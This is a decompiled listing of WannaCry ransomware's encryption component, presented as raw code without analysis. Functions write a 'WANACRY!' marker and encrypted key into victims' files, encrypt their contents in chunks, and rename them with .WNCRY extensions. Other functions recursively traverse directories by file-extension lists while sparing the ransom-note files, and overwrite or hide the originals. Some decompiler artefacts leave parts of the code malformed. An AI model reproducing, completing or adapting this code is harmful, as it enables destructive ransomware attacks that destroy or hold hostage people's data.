  uint32_t local_34c;
  unsigned int local_348;
  HANDLE local_344;
  _FILETIME local_340;
  _FILETIME local_338;
  _FILETIME local_330;
  uint8_t local_328 [5];
  undefined2 local_323;
  uint8_t local_321;
  LARGE_INTEGER local_320;
  DWORD local_318;
  byte local_314 [16];
  void *local_304;
  unsigned int local_300;
  int local_2fc;
  unsigned int local_2f8;
  unsigned int local_2f4;
  wchar_t local_2f0;
  DWORD local_2ee [179];
  int local_20;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  DWORD local_8;
  
  puStack_c = &DAT_10007200;
  puStack_10 = &DAT_10006bb6;
  local_14 = ExceptionList;
  local_2f0 = DAT_1000d918;
  puVar10 = local_2ee;
  for (iVar5 = 0xb3; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  *(undefined2 *)puVar10 = 0;
  local_354 = (HANDLE)0xffffffff;
  local_344 = (HANDLE)0xffffffff;
  uVar8 = 0x80000000;
  local_304 = (void *)((int)this + 4);
  local_34c = 0;
  local_328[0] = 0;
  local_328._1_4_ = 0;
  local_323 = 0;
  local_321 = 0;
  local_348 = 0;
  local_318 = 0;
  local_2f8 = 0;
  local_2f4 = 0;
  local_8 = 0;
  if (param_3 == 3) {
    uVar8 = 0xc0000000;
    local_350 = 0xc0000000;
  }
  ExceptionList = &local_14;
  pvVar1 = (HANDLE)(*DAT_1000d91c)(param_1,uVar8,3,0,3,0,0);
  if (((pvVar1 == (HANDLE)0xffffffff) &&
      ((local_354 = pvVar1, iVar5 = FUN_10003000(), iVar5 == 0 ||
       (pvVar1 = (HANDLE)(*DAT_1000d91c)(param_1,uVar8,3,0,3,0,0), local_354 = pvVar1,
       pvVar1 == (HANDLE)0xffffffff)))) ||
     (local_354 = pvVar1, BVar2 = GetFileSizeEx(pvVar1,&local_320), BVar2 == 0)) goto LAB_1000208e;
  GetFileTime(pvVar1,&local_340,&local_338,&local_330);
  iVar5 = (*DAT_1000d924)(pvVar1,local_328,8,&local_2f8,0);
  if (iVar5 != 0) {
    iVar5 = 2;
    bVar11 = true;
    piVar7 = (int *)local_328;
    piVar9 = (int *)s_WANACRY__1000cbe8;
    do {
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      bVar11 = *piVar7 == *piVar9;
      piVar7 = piVar7 + 1;
      piVar9 = piVar9 + 1;
    } while (bVar11);
    if ((((bVar11) && (iVar5 = (*DAT_1000d924)(local_354,&local_758,4,&local_2f8,0), iVar5 != 0)) &&
        (local_758 < 0x201)) &&
       (((local_758 == 0x100 &&
         (iVar5 = (*DAT_1000d924)(local_354,local_754,0x100,&local_2f8,0), iVar5 != 0)) &&
        ((iVar5 = (*DAT_1000d924)(local_354,&local_348,4,&local_2f8,0), iVar5 != 0 &&
         (param_3 <= local_348)))))) {
      local_unwind2(&local_14,0xffffffff);
      ExceptionList = local_14;
      return 1;
    }
  }
  pvVar1 = local_354;
  SetFilePointer(local_354,0,(PLONG)0x0,0);
  if (param_3 == 4) {
    swprintf(&local_2f0,0x1000cbd8,param_2,&DAT_1000cbe4);
    local_344 = (HANDLE)(*DAT_1000d91c)(&local_2f0,0x40000000,0,0,2,0x80,0);
    if ((local_344 == (HANDLE)0xffffffff) &&
       (local_344 = (HANDLE)(*DAT_1000d91c)(&local_2f0,0x40000000,3,0,2,0x80,0),
       local_344 == (HANDLE)0xffffffff)) goto LAB_1000208e;
    if (local_348 == 3) {
      bVar11 = 0xffff < local_320.s.LowPart;
      local_320.s.LowPart = local_320.s.LowPart - 0x10000;
      local_320.s.HighPart = local_320.s.HighPart + -1 + (uint)bVar11;
    }
  }
  else {
    iVar5 = (*DAT_1000d924)(pvVar1,*(uint32_t *)((int)this + 0x4c8),0x10000,&local_2f8,0);
    if ((iVar5 == 0) || (local_2f8 != 0x10000)) goto LAB_1000208e;
    SetFilePointer(pvVar1,0,(PLONG)0x0,2);
    iVar5 = (*DAT_1000d920)(pvVar1,*(uint32_t *)((int)this + 0x4c8),0x10000,&local_2f4,0);
    if ((iVar5 == 0) || (local_2f4 != 0x10000)) goto LAB_1000208e;
    puVar10 = *(uint32_t **)((int)this + 0x4c8);
    for (iVar5 = 0x4000; iVar5 != 0; iVar5 = iVar5 + -1) {
      *puVar10 = 0;
      puVar10 = puVar10 + 1;
    }
    SetFilePointer(pvVar1,0,(PLONG)0x0,0);
    iVar5 = (*DAT_1000d920)(pvVar1,*(undefined4 *)((int)this + 0x4c8),0x10000,&local_2f4,0);
    if ((iVar5 == 0) || (local_2f4 != 0x10000)) goto LAB_1000208e;
    SetFilePointer(pvVar1,0,(PLONG)0x0,0);
    local_344 = pvVar1;
  }
  hFile = local_344;
  if (((((param_3 == 4) && (local_320.s.HighPart < 1)) && (local_320.s.LowPart < 0xc800000)) &&
      ((*(int *)((int)this + 0x918) != 0 &&
       (uVar3 = rand(), uVar3 % *(uint *)((int)this + 0x918) == 0)))) &&
     (*(uint *)((int)this + 0x920) < *(uint *)((int)this + 0x91c))) {
    local_318 = 1;
    local_304 = (void *)((int)this + 0x2c);
    *(uint *)((int)this + 0x920) = *(uint *)((int)this + 0x920) + 1;
  }
  local_34c = 0x200;
  iVar5 = FUN_10004370(local_304,local_314,0x10,local_554,&local_34c);
  if (iVar5 != 0) {
    FUN_10005dc0((void *)((int)this + 0x54),local_314,PTR_DAT_1000d8d4,0x10,0x10);
    pbVar4 = local_314;
    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {
      *pbVar4 = 0;
      pbVar4 = pbVar4 + 1;
    }
    iVar5 = (*DAT_1000d920)(hFile,s_WANACRY__1000cbe8,8,&local_2f4,0);
    if (((iVar5 != 0) && (iVar5 = (*DAT_1000d920)(hFile,&local_34c,4,&local_2f4,0), iVar5 != 0)) &&
       ((iVar5 = (*DAT_1000d920)(hFile,local_554,local_34c,&local_2f4,0), iVar5 != 0 &&
        ((iVar5 = (*DAT_1000d920)(hFile,&param_3,4,&local_2f4,0), iVar5 != 0 &&
         (iVar5 = (*DAT_1000d920)(hFile,&local_320,8,&local_2f4,0), iVar5 != 0)))))) {
      if (param_3 != 4) {
LAB_100020b7:
        SetFileTime(hFile,&local_340,&local_338,&local_330);
        if (param_3 == 4) {
          (*DAT_1000d934)();
          (*DAT_1000d934)(hFile);
          local_344 = (HANDLE)0xffffffff;
          local_354 = (HANDLE)0xffffffff;
          iVar5 = (*DAT_1000d928)(&local_2f0,param_2);
          local_20 = iVar5;
          if (iVar5 == 0) {
            (*DAT_1000d930)(&local_2f0);
          }
          else {
            SetFileAttributesW(param_2,0x80);
          }
        }
        else {
          (*DAT_1000d934)(pvVar1);
          local_344 = (HANDLE)0xffffffff;
          local_354 = (HANDLE)0xffffffff;
          iVar5 = (*DAT_1000d928)(param_1,param_2);
          local_20 = iVar5;
        }
        if ((iVar5 != 0) && (*(code **)((int)this + 0x4d4) != (code *)0x0)) {
          (**(code **)((int)this + 0x4d4))
                    (param_1,param_2,local_320.s.HighPart,local_320.s.LowPart,param_3,local_318);
        }
        local_unwind2(&local_14,0xffffffff);
        ExceptionList = local_14;
        return iVar5;
      }
      local_300 = local_320.s.LowPart;
      local_2fc = local_320.s.HighPart;
      if (local_348 == 3) {
        SetFilePointer(pvVar1,-0x10000,(PLONG)0x0,2);
        iVar5 = (*DAT_1000d924)(pvVar1,*(undefined4 *)((int)this + 0x4c8),0x10000,&local_2f8,0);
        if ((iVar5 == 0) || (local_2f8 != 0x10000)) goto LAB_1000208e;
        FUN_10006940((void *)((int)this + 0x54),*(uint **)((int)this + 0x4c8),
                     *(uint **)((int)this + 0x4cc),0x10000,1);
        iVar5 = (*DAT_1000d920)(hFile,*(undefined4 *)((int)this + 0x4cc),0x10000,&local_2f4,0);
        if ((iVar5 == 0) || (local_2f4 != 0x10000)) goto LAB_1000208e;
        SetFilePointer(pvVar1,0x10000,(PLONG)0x0,0);
        bVar11 = 0xffff < local_300;
        local_300 = local_300 - 0x10000;
        local_2fc = local_2fc + -1 + (uint)bVar11;
      }
      while( true ) {
        pvVar1 = local_354;
        hFile = local_344;
        if ((local_2fc < 0) || ((local_2fc < 1 && (local_300 == 0)))) goto LAB_100020b7;
        if ((((*(int **)((int)this + 0x4d0) != (int *)0x0) && (**(int **)((int)this + 0x4d0) != 0))
            || (iVar5 = (*DAT_1000d924)(local_354,*(uint32_t *)((int)this + 0x4c8),0x100000,
                                        &local_2f8,0), iVar5 == 0)) || (local_2f8 == 0)) break;
        bVar11 = local_300 < local_2f8;
        local_300 = local_300 - local_2f8;
        local_2fc = local_2fc - (uint)bVar11;
        uVar3 = ((local_2f8 - 1 >> 4) + 1) * 0x10;
        if (local_2f8 < uVar3) {
          puVar10 = (undefined4 *)(*(int *)((int)this + 0x4c8) + local_2f8);
          for (uVar6 = uVar3 - local_2f8 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
            *puVar10 = 0;
            puVar10 = puVar10 + 1;
          }
          for (uVar6 = uVar3 - local_2f8 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
            *(undefined1 *)puVar10 = 0;
            puVar10 = (undefined4 *)((int)puVar10 + 1);
          }
        }
        FUN_10006940((void *)((int)this + 0x54),*(uint **)((int)this + 0x4c8),
                     *(uint **)((int)this + 0x4cc),uVar3,1);
        iVar5 = (*DAT_1000d920)(local_344,*(uint **)((int)this + 0x4cc),uVar3,&local_2f4,0);
        if ((iVar5 == 0) || (local_2f4 != uVar3)) break;
      }
    }
  }
LAB_1000208e:
  local_unwind2(&local_14,0xffffffff);
  ExceptionList = local_14;
  return 0;
}



undefined4 __thiscall FUN_10002200(void *this,wchar_t *param_1,uint param_2)

{
  wchar_t *_Str1;
  int iVar1;
  DWORD DVar2;
  wchar_t local_2d0 [360];
  
  if (param_2 == 4) {
    wcscpy(local_2d0,param_1);
    _Str1 = wcsrchr(local_2d0,L'.');
    if (_Str1 == (wchar_t *)0x0) {
      _Str1 = local_2d0;
    }
    else {
      iVar1 = _wcsicmp(_Str1,u__WNCYR_1000cc04);
      if (iVar1 == 0) {
        wcscpy(_Str1,u__WNCRY_1000cbf4);
        goto LAB_1000229a;
      }
    }
    wcscat(_Str1,u__WNCRY_1000cbf4);
  }
  else {
    swprintf(local_2d0,0x1000cbd8,param_1,u__WNCYR_1000cc04);
  }
LAB_1000229a:
  DVar2 = GetFileAttributesW(local_2d0);
  if (DVar2 == 0xffffffff) {
    iVar1 = FUN_10001960(this,param_1,local_2d0,param_2);
    if (iVar1 == 0) {
      (*DAT_1000d930)(local_2d0);
      return 0;
    }
  }
  if (param_2 == 4) {
    FUN_10002ba0(this,param_1);
  }
  return 1;
}



undefined4 __thiscall
FUN_10002300(void *this,LPCWSTR param_1,void *param_2,uint param_3,int param_4)

{
  WCHAR *pWVar1;
  WCHAR WVar2;
  int *piVar3;
  int *piVar4;
  bool bVar5;
  HANDLE hFindFile;
  undefined4 uVar6;
  int iVar7;
  undefined3 extraout_var;
  size_t sVar8;
  BOOL BVar9;
  code *pcVar10;
  LPCWSTR pWVar11;
  int *piVar12;
  undefined4 *puVar13;
  unsigned int local_a4c [4];
  int *local_a48;
  undefined4 local_a44;
  unsigned int local_a40 [4];
  int *local_a3c;
  int local_a38;
  void *local_a34;
  int local_a30;
  HANDLE local_a2c;
  int local_a28;
  basic_string<> local_a24 [16];
  DWORD local_a14;
  _WIN32_FIND_DATAW local_a10;
  wchar_t local_7c0 [360];
  wchar_t local_4f0;
  DWORD local_4ee [179];
  wchar_t local_220 [260];
  unsigned int local_18;
  DWORD local_14;
  int local_10;
  void *local_c;
  uint8_t *puStack_8;
  HANDLE local_4;
  
  local_4 = (HANDLE)0xffffffff;
  puStack_8 = &LAB_10006e22;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  local_a34 = this;
  local_a3c = operator_new(0x4ec);
  *local_a3c = (int)local_a3c;
  local_a3c[1] = (int)local_a3c;
  local_a38 = 0;
  local_4 = (HANDLE)0x0;
  local_a48 = (int *)FUN_10003730((uint32_t *)0x0,0);
  local_a44 = 0;
  local_4._0_1_ = 1;
  swprintf(local_7c0,0x1000ccb8,param_1);
  hFindFile = FindFirstFileW(local_7c0,&local_a10);
  local_a2c = hFindFile;
  if (hFindFile == (HANDLE)0xffffffff) {
    local_4 = (HANDLE)((uint)local_4._1_3_ << 8);
    FUN_100036a0(local_a4c,(int *)&local_a34,(int *)*local_a48,local_a48);
    operator_delete(local_a48);
    local_a48 = (int *)0x0;
    local_a44 = 0;
    local_4 = hFindFile;
    FUN_100037c0(local_a40,&local_a34,(int *)*local_a3c,local_a3c);
    operator_delete(local_a3c);
    uVar6 = 0;
  }
  else {
    local_a28 = FUN_10002f70(param_1);
    do {
      if ((*(int **)((int)this + 0x4d0) != (int *)0x0) && (**(int **)((int)this + 0x4d0) != 0))
      break;
      iVar7 = wcscmp(local_a10.cFileName,(wchar_t *)&DAT_1000ccb4);
      if ((iVar7 != 0) && (iVar7 = wcscmp(local_a10.cFileName,(wchar_t *)&DAT_1000ccac), iVar7 != 0)
         ) {
        swprintf(local_7c0,0x1000cca0,param_1,local_a10.cFileName);
        if (((byte)local_a10.dwFileAttributes & 0x10) == 0) {
          if ((((local_a28 != 0) &&
               (iVar7 = wcscmp(local_a10.cFileName,u__Please_Read_Me__txt_1000cc74), iVar7 != 0)) &&
              (iVar7 = wcscmp(local_a10.cFileName,u__WanaDecryptor__exe_lnk_1000cc44), iVar7 != 0))
             && (iVar7 = wcscmp(local_a10.cFileName,u__WanaDecryptor__bmp_1000cc1c), iVar7 != 0)) {
            local_4f0 = L'\0';
            puVar13 = local_4ee;
            for (iVar7 = 0x138; iVar7 != 0; iVar7 = iVar7 + -1) {
              *puVar13 = 0;
              puVar13 = puVar13 + 1;
            }
            *(undefined2 *)puVar13 = 0;
            local_10 = FUN_10002d60(local_a10.cFileName);
            if (((local_10 != 6) && (local_10 != 1)) &&
               ((local_10 != 0 ||
                ((local_a10.nFileSizeHigh != 0 || (0xc7fffff < local_a10.nFileSizeLow)))))) {
              wcsncpy(local_220,local_a10.cFileName,0x103);
              wcsncpy(&local_4f0,local_7c0,0x167);
              local_14 = local_a10.nFileSizeHigh;
              local_18 = local_a10.nFileSizeLow;
              FUN_10003760(local_a40,&local_a30,local_a3c,(undefined4 *)&local_4f0);
            }
          }
        }
        else {
          bVar5 = FUN_100032c0(local_7c0,local_a10.cFileName);
          if (CONCAT31(extraout_var,bVar5) == 0) {
            std::basic_string<>::_Tidy(local_a24,false);
            sVar8 = wcslen(local_7c0);
            std::basic_string<>::assign(local_a24,(ushort *)local_7c0,sVar8);
            local_4._0_1_ = 2;
            FUN_100035c0(local_a4c,&local_a14,local_a48,local_a24);
            local_4._0_1_ = 1;
            std::basic_string<>::_Tidy(local_a24,true);
          }
        }
      }
      hFindFile = local_a2c;
      BVar9 = FindNextFileW(local_a2c,&local_a10);
    } while (BVar9 != 0);
    FindClose(hFindFile);
    piVar12 = (int *)*local_a3c;
    if (piVar12 != local_a3c) {
      do {
        iVar7 = FUN_10002940(this,(wchar_t *)(piVar12 + 2),1);
        if (iVar7 == 0) {
          FUN_10003760(param_2,&local_a30,*(void **)((int)param_2 + 4),piVar12 + 2);
        }
        piVar12 = (int *)*piVar12;
      } while (piVar12 != local_a3c);
    }
    if (param_3 == 0xffffffff) {
      iVar7 = _wcsnicmp(param_1,(wchar_t *)&DAT_1000cc14,2);
      pWVar11 = param_1;
      if (iVar7 == 0) {
        pWVar11 = param_1 + 2;
      }
      param_3 = (uint)(iVar7 != 0);
      WVar2 = *pWVar11;
      while (WVar2 != L'\0') {
        if (WVar2 == L'\\') {
          param_3 = param_3 + 1;
        }
        pWVar1 = pWVar11 + 1;
        pWVar11 = pWVar11 + 1;
        WVar2 = *pWVar1;
      }
    }
    if (((int)param_3 < 7) && (local_a38 != 0)) {
      FUN_10003200(param_1);
      if ((int)param_3 < 5) {
        FUN_10003280(param_1);
      }
      else {
        FUN_10003240(param_1);
      }
    }
    if ((param_4 != 0) && (piVar12 = (int *)*local_a48, piVar12 != local_a48)) {
      do {
        pcVar10 = (code *)piVar12[3];
        if ((code *)piVar12[3] == (code *)0x0) {
          pcVar10 = _C_exref;
        }
        FUN_10002300(local_a34,(LPCWSTR)pcVar10,param_2,param_3 + 1,param_4);
        piVar12 = (int *)*piVar12;
      } while (piVar12 != local_a48);
    }
    piVar4 = local_a48;
    local_4 = (HANDLE)((uint)local_4._1_3_ << 8);
    piVar12 = (int *)*local_a48;
    while (piVar12 != piVar4) {
      piVar3 = (int *)*piVar12;
      FUN_10003620(local_a4c,&local_a30,piVar12);
      piVar12 = piVar3;
    }
    operator_delete(local_a48);
    piVar4 = local_a3c;
    local_a48 = (int *)0x0;
    local_a44 = 0;
    piVar12 = (int *)*local_a3c;
    while (piVar12 != piVar4) {
      piVar3 = (int *)*piVar12;
      *(int *)piVar12[1] = *piVar12;
      *(int *)(*piVar12 + 4) = piVar12[1];
      operator_delete(piVar12);
      local_a38 = local_a38 + -1;
      piVar12 = piVar3;
    }
    operator_delete(local_a3c);
    unsigned Var6 = 1;
  }
  ExceptionList = local_c;
  return uVar6;
}



undefined4 __thiscall FUN_100027f0(void *this,LPCWSTR param_1,int *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  uint uVar4;
  int *piVar5;
  int *piVar6;
  unsigned int local_18 [4];
  int *local_14;
  int local_10;
  void *local_c;
  unsigned int *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_10006e38;
  local_c = ExceptionList;
  local_18[0] = param_2._0_1_;
  ExceptionList = &local_c;
  local_14 = operator_new(0x4ec);
  *local_14 = (int)local_14;
  local_14[1] = (int)local_14;
  local_10 = 0;
  local_4 = 0;
  FUN_10002300(this,param_1,local_18,0xffffffff,(int)param_2);
  unsigned Var4 = 2;
  piVar3 = local_14;
  do {
    piVar5 = (int *)*piVar3;
    if ((int *)*piVar3 != piVar3) {
      do {
        if ((*(int **)((int)this + 0x4d0) != (int *)0x0) && (**(int **)((int)this + 0x4d0) != 0))
        break;
        iVar1 = FUN_10002940(this,(wchar_t *)(piVar5 + 2),uVar4);
        if (iVar1 == 0) {
          piVar6 = (int *)*piVar5;
        }
        else {
          piVar6 = (int *)*piVar5;
          *(int *)piVar5[1] = *piVar5;
          *(int *)(*piVar5 + 4) = piVar5[1];
          operator_delete(piVar5);
          local_10 = local_10 + -1;
        }
        piVar3 = local_14;
        piVar5 = piVar6;
      } while (piVar6 != local_14);
    }
    uVar4 = uVar4 + 1;
    if (4 < uVar4) {
      FUN_10002ba0(this,(wchar_t *)0x0);
      piVar6 = local_14;
      local_4 = 0xffffffff;
      piVar3 = (int *)*local_14;
      piVar5 = param_2;
      while (param_2 = piVar3, param_2 != piVar6) {
        piVar3 = (int *)*param_2;
        puVar2 = (undefined4 *)FUN_100035b0(&param_2,&param_1);
        piVar5 = (int *)*puVar2;
        *(int *)piVar5[1] = *piVar5;
        *(int *)(*piVar5 + 4) = piVar5[1];
        operator_delete(piVar5);
        local_10 = local_10 + -1;
        piVar5 = param_2;
      }
      param_2 = piVar5;
      operator_delete(local_14);
      ExceptionList = local_c;
      return 1;
    }
  } while( true );
}



undefined4 __thiscall FUN_10002940(void *this,wchar_t *param_1,uint param_2)

{
  int iVar1;
  
  iVar1 = FUN_10002e70((int)param_1,param_2);
  switch(iVar1) {
  case 0:
    return 1;
  default:
    return 0;
  case 2:
    (*DAT_1000d930)(param_1);
    return 1;
  case 3:
    break;
  case 4:
    FUN_10002200(this,param_1,4);
    return 1;
  }
  iVar1 = FUN_10002200(this,param_1,3);
  if (iVar1 == 0) {
    return 0;
  }
  wcscat(param_1,u__WNCYR_1000cc04);
  wcscat(param_1 + 0x168,u__WNCYR_1000cc04);
  param_1[0x270] = L'\x05';
  param_1[0x271] = L'\0';
  return 0;
}



void __fastcall FUN_100029f0(int param_1)

{
  wchar_t *_Str;
  char cVar1;
  code *pcVar2;
  int *piVar3;
  size_t sVar4;
  DWORD DVar5;
  int iVar6;
  code *lpFileName;
  
  iVar6 = *(int *)(param_1 + 0x4dc);
  while (iVar6 == 0) {
    iVar6 = 0;
    do {
      if (*(int *)(param_1 + 0x4dc) != 0) goto LAB_10002b88;
      Sleep(1000);
      iVar6 = iVar6 + 1;
    } while (iVar6 < 0x3c);
    if (*(int *)(param_1 + 0x4dc) != 0) break;
    EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x4ec));
    if (*(int *)(param_1 + 0x4e8) != 0) {
      _Str = (wchar_t *)(param_1 + 0x70c);
      do {
        pcVar2 = *(code **)(**(int **)(param_1 + 0x4e4) + 0xc);
        lpFileName = _C_exref;
        if (pcVar2 != (code *)0x0) {
          lpFileName = pcVar2;
        }
        sVar4 = wcslen(_Str);
        if (sVar4 == 0) {
LAB_10002ae4:
          iVar6 = (*DAT_1000d930)(lpFileName);
          if (iVar6 == 0) {
            DVar5 = GetFileAttributesW((LPCWSTR)lpFileName);
            SetFileAttributesW((LPCWSTR)lpFileName,DVar5 | 2);
            (*DAT_1000d92c)(lpFileName,0,4);
          }
        }
        else {
          iVar6 = (*DAT_1000d92c)(lpFileName,_Str,1);
          if ((iVar6 == 0) && (DVar5 = GetFileAttributesW(_Str), DVar5 != 0xffffffff)) {
            DVar5 = GetFileAttributesW(_Str);
            SetFileAttributesW(_Str,DVar5 | 2);
            (*DAT_1000d92c)(_Str,0,4);
          }
          iVar6 = *(int *)(param_1 + 0x914);
          *(int *)(param_1 + 0x914) = iVar6 + 1;
          swprintf(_Str,0x1000cbb8,(wchar_t *)(param_1 + 0x504),iVar6,u__WNCRYT_1000cbc8);
          iVar6 = (*DAT_1000d92c)(lpFileName,_Str,1);
          if (iVar6 == 0) goto LAB_10002ae4;
        }
        piVar3 = (int *)**(undefined4 **)(param_1 + 0x4e4);
        *(int *)piVar3[1] = *piVar3;
        *(int *)(*piVar3 + 4) = piVar3[1];
        iVar6 = piVar3[3];
        if (iVar6 != 0) {
          cVar1 = *(char *)(iVar6 + -1);
          if ((cVar1 == '\0') || (cVar1 == -1)) {
            operator_delete((void *)(iVar6 + -2));
          }
          else {
            *(char *)(iVar6 + -1) = cVar1 + -1;
          }
        }
        piVar3[3] = 0;
        piVar3[4] = 0;
        piVar3[5] = 0;
        operator_delete(piVar3);
        iVar6 = *(int *)(param_1 + 0x4e8) + -1;
        *(int *)(param_1 + 0x4e8) = iVar6;
      } while (iVar6 != 0);
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x4ec));
    iVar6 = *(int *)(param_1 + 0x4dc);
  }
LAB_10002b88:
                    // WARNING: Subroutine does not return
  ExitThread(0);
}



void __thiscall FUN_10002ba0(void *this,wchar_t *param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  char cVar1;
  int *piVar2;
  wchar_t *_Str;
  bool bVar3;
  size_t sVar4;
  int *piVar5;
  int *piVar6;
  int *piVar7;
  basic_string<> local_1c [4];
  undefined2 *local_18;
  size_t local_14;
  undefined4 local_10;
  void *local_c;
  unsigned int *puStack_8;
  undefined4 local_4;
  
  _Str = param_1;
  local_4 = 0xffffffff;
  puStack_8 = &LAB_10006e59;
  local_c = ExceptionList;
  if (param_1 == (wchar_t *)0x0) {
    ExceptionList = &local_c;
    sVar4 = wcslen((wchar_t *)((int)this + 0x70c));
    if (sVar4 != 0) {
      (*DAT_1000d930)((wchar_t *)((int)this + 0x70c));
    }
    ExceptionList = local_c;
    return;
  }
  ExceptionList = &local_c;
  sVar4 = wcslen((wchar_t *)((int)this + 0x70c));
  if (sVar4 == 0) {
    FUN_10003010();
  }
  lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x4ec);
  EnterCriticalSection(lpCriticalSection);
  param_1._0_1_ = SUB41(lpCriticalSection,0);
  local_1c[0] = param_1._0_1_;
  local_18 = (undefined2 *)0x0;
  local_14 = 0;
  local_10 = 0;
  sVar4 = wcslen(_Str);
  bVar3 = std::basic_string<>::_Grow(local_1c,sVar4,true);
  if (bVar3) {
    FUN_10002d30(local_18,_Str,sVar4);
    local_18[sVar4] = 0;
    local_14 = sVar4;
  }
  piVar2 = *(int **)((int)this + 0x4e4);
  local_4 = 0;
  piVar7 = (int *)piVar2[1];
  piVar5 = operator_new(0x18);
  piVar6 = piVar2;
  if (piVar2 == (int *)0x0) {
    piVar6 = piVar5;
  }
  *piVar5 = (int)piVar6;
  if (piVar7 == (int *)0x0) {
    piVar7 = piVar5;
  }
  piVar5[1] = (int)piVar7;
  piVar2[1] = (int)piVar5;
  *(int **)piVar5[1] = piVar5;
  FUN_10003810((basic_string<> *)(piVar5 + 2),local_1c);
  *(int *)((int)this + 0x4e8) = *(int *)((int)this + 0x4e8) + 1;
  if (local_18 != (undefined2 *)0x0) {
    cVar1 = *(char *)((int)local_18 + -1);
    if ((cVar1 != '\0') && (cVar1 != -1)) {
      *(char *)((int)local_18 + -1) = cVar1 + -1;
      LeaveCriticalSection(lpCriticalSection);
      ExceptionList = local_c;
      return;
    }
    operator_delete(local_18 + -1);
  }
  LeaveCriticalSection(lpCriticalSection);
  ExceptionList = local_c;
  return;
}



void __cdecl FUN_10002d30(undefined2 *param_1,undefined2 *param_2,int param_3)

{
  undefined2 uVar1;
  
  for (; param_3 != 0; param_3 = param_3 + -1) {
    uVar1 = *param_2;
    param_2 = param_2 + 1;
    *param_1 = uVar1;
    param_1 = param_1 + 1;
  }
  return;
}



int FUN_10002d60(wchar_t *param_1)

{
  undefined **ppuVar1;
  undefined *puVar2;
  wchar_t *_Str1;
  int iVar3;
  undefined **ppuVar4;
  
  _Str1 = wcsrchr(param_1,L'.');
  if (_Str1 == (wchar_t *)0x0) {
    return 0;
  }
  iVar3 = _wcsicmp(_Str1,u__exe_1000ccd0);
  if ((iVar3 == 0) || (iVar3 = _wcsicmp(_Str1,u__dll_1000ccc4), iVar3 == 0)) {
    return 1;
  }
  iVar3 = _wcsicmp(_Str1,u__WNCRY_1000cbf4);
  if (iVar3 == 0) {
    return 6;
  }
  ppuVar4 = &PTR_u__doc_1000c098;
  puVar2 = PTR_u__doc_1000c098;
  while (puVar2 != (undefined *)0x0) {
    iVar3 = _wcsicmp((wchar_t *)*ppuVar4,_Str1);
    if (iVar3 == 0) {
      return 2;
    }
    ppuVar1 = ppuVar4 + 1;
    ppuVar4 = ppuVar4 + 1;
    puVar2 = *ppuVar1;
  }
  ppuVar4 = &PTR_u__docb_1000c0fc;
  puVar2 = PTR_u__docb_1000c0fc;
  while (puVar2 != (undefined *)0x0) {
    iVar3 = _wcsicmp((wchar_t *)*ppuVar4,_Str1);
    if (iVar3 == 0) {
      return 3;
    }
    ppuVar1 = ppuVar4 + 1;
    ppuVar4 = ppuVar4 + 1;
    puVar2 = *ppuVar1;
  }
  iVar3 = _wcsicmp(_Str1,u__WNCRYT_1000cbc8);
  if (iVar3 != 0) {
    iVar3 = _wcsicmp(_Str1,u__WNCYR_1000cc04);
    return (-(uint)(iVar3 != 0) & 0xfffffffb) + 5;
  }
  return 4;
}



int FUN_10002e70(int param_1,uint param_2)

{
  int iVar1;
  bool bVar2;
  bool bVar3;
  
  if (3 < param_2) {
    return 4;
  }
  iVar1 = *(int *)(param_1 + 0x4e0);
  if (iVar1 == 0) {
    return 1;
  }
  if (param_2 == 3) {
    return 4;
  }
  if (iVar1 == 5) {
    return 1;
  }
  if (iVar1 == 4) {
    return 2;
  }
  bVar2 = false;
  bVar3 = false;
  if ((*(int *)(param_1 + 0x4dc) != 0) ||
     (bVar2 = *(uint *)(param_1 + 0x4d8) < 0x401, 0xc7fffff < *(uint *)(param_1 + 0x4d8))) {
    bVar3 = true;
  }
  if (param_2 == 1) {
    if (iVar1 == 2) {
      if (bVar3) {
        return 3;
      }
LAB_10002f56:
      return (-(uint)bVar2 & 0xfffffffd) + 4;
    }
    if (iVar1 == 3) {
      return 1;
    }
  }
  else if (param_2 == 2) {
    if (iVar1 == 2) {
      return 1;
    }
    if (iVar1 == 3) {
      if (bVar3) {
        return 3;
      }
      goto LAB_10002f56;
    }
  }
  return 0;
}



undefined4 __cdecl FUN_10002f70(LPCWSTR param_1)

{
  int iVar1;
  undefined4 *puVar2;
  WCHAR *pWStack_2f0;
  undefined4 uStack_2ec;
  undefined4 uStack_2e8;
  WCHAR local_2d0;
  undefined4 local_2ce [179];
  
  local_2d0 = L'\0';
  puVar2 = local_2ce;
  for (iVar1 = 0xb3; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  uStack_2e8 = 0x10002fa7;
  GetTempFileNameW(param_1,(LPCWSTR)&DAT_1000ccdc,0,&local_2d0);
  uStack_2e8 = 0;
  pWStack_2f0 = &local_2d0;
  uStack_2ec = 0x40000000;
  pWStack_2f0 = (WCHAR *)(*DAT_1000d91c)();
  if (pWStack_2f0 != (WCHAR *)0xffffffff) {
    (*DAT_1000d934)();
    iVar1 = (*DAT_1000d930)(&pWStack_2f0);
    if (iVar1 != 0) {
      return 1;
    }
  }
  return 0;
}



undefined4 FUN_10003000(void)

{
  return 0;
}



undefined4 FUN_10003010(void)

{
  DWORD DVar1;
  HANDLE hFile;
  int iVar2;
  undefined4 uVar3;
  int unaff_EBX;
  int iVar4;
  uint uVar5;
  undefined4 *puVar6;
  bool bVar7;
  void *in_stack_00040000;
  LPCWSTR in_stack_00040018;
  uint uVar8;
  LPCWSTR pWStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  LARGE_INTEGER LStack_1c;
  
  FUN_10006bd0();
  DVar1 = GetFileAttributesW(in_stack_00040018);
  if (DVar1 == 0xffffffff) {
    return 0;
  }
